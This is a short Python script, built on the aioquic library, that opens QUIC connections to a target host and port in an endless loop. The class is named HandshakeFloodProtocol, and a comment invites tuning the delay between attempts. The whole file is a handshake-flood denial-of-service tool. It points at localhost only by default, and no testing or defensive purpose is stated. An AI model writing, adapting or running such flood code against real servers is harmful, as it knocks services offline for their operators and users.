import asyncio
import logging
from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration

logging.basicConfig(level=logging.INFO)

target_ip = "127.0.0.1"
target_port = 4433

class HandshakeFloodProtocol(QuicConnectionProtocol):
    def quic_event_received(self, event):
        pass

async def send_handshake_requests(target_ip, target_port):
    configuration = QuicConfiguration(is_client=True)
    while True:
        try:
            async with connect(target_ip, target_port, configuration=configuration, create_protocol=HandshakeFloodProtocol) as protocol:
                await asyncio.sleep(0.1)  # Adjust the sleep time as needed
        except Exception as e:
            logging.error(f"Failed to connect: {e}")

if __name__ == "__main__":
    asyncio.run(send_handshake_requests(target_ip, target_port))